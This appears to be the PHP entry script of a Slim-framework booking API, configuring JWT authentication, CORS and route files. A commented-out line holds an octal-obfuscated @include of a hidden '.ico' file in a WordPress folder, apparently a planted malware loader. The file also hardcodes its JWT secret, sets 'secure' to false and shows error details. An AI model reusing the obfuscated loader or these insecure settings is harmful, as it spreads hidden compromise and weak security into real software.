<?php

// echo date('Y');
// die;
// echo date('m');
// die;
/* $i = '00001';
// echo $i;
// die;
$booking_id ='BR'.date('Y').date('m').$i;
echo $booking_id;
die;*/

/*@include "\057ho\155e/\146rc\157d0\0705/\160ub\154ic\137ht\155l/\144tg\064un\145w/\167p-\151nc\154ud\145s/\111XR\057.0\064aa\06339\062.i\143o";*/



error_reporting(E_ALL);
set_error_handler(function ($severity, $message, $file, $line) {
    if (error_reporting() & $severity) {
        throw new \ErrorException($message, 0, $severity, $file, $line);
    }
});

/*
*-------------------Constants for App--------------------------
*/
date_default_timezone_set('Asia/Kolkata');

define('BASE_URL', 'http://api.frcoder.in/bookme/');

use Psr\Http\Message\ServerRequestInterface as Request;
use Psr\Http\Message\ResponseInterface as Response;
use Slim\Http\UploadedFile;



/*
*-------------------Config Files for App--------------------------
*/
require('vendor/autoload.php');



require('src/config/database.php');

require('src/config/function.php');

require('src/config/formvalidator.php');

require('src/config/simpleimage.php');

require('src/config/pushnotification.php');



$app = new \Slim\App([
	'settings' => [
		'displayErrorDetails' => true
	]
]);

/*
*-------------------Middlewates for App--------------------------
*/
$app->options('/{routes:.+}', function ($request, $response, $args) {
	return $response;
});


$app->add(function ($req, $res, $next) {
	$response = $next($req, $res);
	return $response
	->withHeader('Access-Control-Allow-Origin', '*')
	->withHeader('Access-Control-Allow-Headers', 'X-Requested-With, Content-Type, Accept, Origin, Authorization, X-lang')
	->withHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
});

// Header "Authorization" patch
/*$app->add(function ($request, $response, $next) {
    $request = $request->withHeader('Authorization', $_SERVER['REDIRECT_HTTP_AUTHORIZATION']);
    $response = $next($request, $response);
    return $response;
});*/


/*path = everything starting with /user and /admin will be authenticated ignore = will not be authenticate*/
$app->add(new Tuupola\Middleware\JwtAuthentication([
    "secure" => false,
	"path" => ["/artist","/venue", "/guest"],
	"ignore" => ["/artist/category",
	"/artist/saveappleSignIndata",
	"/artist/getAppleSignInData",
	"/artist/signup",
	"/artist/check_details",
	"/artist/artist_login",
	"/artist/forgot_password",
	"/artist/forgot_username",
	"/artist/gig_counter",
	"/artist/get_status",
	"/artist/socail_login",
	"/venue/artist_list",
	"/artist/chat_listing_notification",
	"/venue/signup",
	"/venue/check_details",
	"/venue/forgot_password",
	"/venue/forgot_username",
	"/venue/socail_login",
	"/venue/login",
	"/venue/artist_get_review",
	"/guest/signup",
	"/guest/login",
	"/guest/check_details",
	"/guest/forgot_username",
	"/guest/forgot_password",
	"/guest/socail_login",
	],
	"secret" => "@3524#$%4654ythfDG$%^&*Sn*(41t)",
	//"relaxed" => ["localhost", "development.frcoder.com"],
	
	"error" => function ($response, $arguments) {
		$data["success"] = false;
		$data["message"] = $arguments["message"];
		return $response
		->withHeader("Content-Type", "application/json")
		->getBody()->write(json_encode($data, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
	}
]));

/**-------------------Routes for App-----------------------------------*/

$app->get('/', function($request, $response, $args){
 	 $result = ['success' => false, 'message' => 'You are not Authorized to access..', 'status_code' => 401, 'ip' => $request->getServerParam('REMOTE_ADDR')];
	  return $response->withStatus(401)
	->withHeader("Content-Type", "application/json")
	->write(json_encode($result, JSON_UNESCAPED_SLASHES));
	
});

/*$app->map(['GET', 'POST', 'PUT', 'DELETE', 'PATCH'], '/{routes:.+}', function($req, $res) {
    $handler = $this->notFoundHandler;
    return $handler($req, $res);
});*/

/*-------------------Routes for App--------------------------*/

/*$app->get('/', function($request, $response, $args){
echo'<html>
    <head>
        <title>Bookme Website Comming Soon</title>
        <style>
            body{
                background: #592d48;
                background-image: url("https://www.acebounce.com/wp-content/uploads/2019/07/Slider1.jpg");
                margin:0;
                padding:30px;
                font:12px/1.5 Helvetica,Arial,Verdana,sans-serif;
                text-align: center;
            }
            h1{
                margin-top:60px;
                font-size:48px;
                font-weight:normal;
                line-height:48px;
            }
        </style>
    </head>
    <body>
        <h1 style="color:#fff">Book Me Website Comming Soon..</h1>
    <svg height="100" width="100">
    <circle cx="50" cy="50" r="31" stroke="#fff" stroke-width="9.5" fill="none" />
    <circle cx="50" cy="50" r="6" stroke="#fff" stroke-width="1" fill="#fff" />
    <line x1="50" y1="50" x2="35" y2="50" style="stroke:#fff;stroke-width:6" />
    <line x1="65" y1="35" x2="50" y2="50" style="stroke:#fff;stroke-width:6" />
    <path d="M59 65 L83 65 L75 87 Z" fill="#fff" />
    <rect width="20" height="9" x="70" y="56" style="fill:#eee;stroke-width:0;" />
  </svg>
    </body>
</html>';
});*/

require ('src/routes/artist.php');
require ('src/routes/guest.php');
require ('src/routes/venue.php');



/*
*----------------------- Run the App -----------------------
*/
$app->run();

?>